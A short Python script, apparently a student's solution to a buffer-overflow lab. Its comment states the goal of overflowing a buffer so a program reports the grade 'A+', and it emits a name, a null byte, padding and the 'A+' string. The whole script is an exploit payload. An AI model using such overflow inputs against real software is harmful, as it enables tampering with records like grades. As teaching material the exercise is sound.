#!/usr/bin/env python3

import sys

#write something that will overflow the buffer with 
#Hi cbcald! Your grade is A+.
sys.stdout.buffer.write(b'cbcald' + b'\0')
sys.stdout.buffer.write(b'A' * 3 + b'A+' + b'\0')


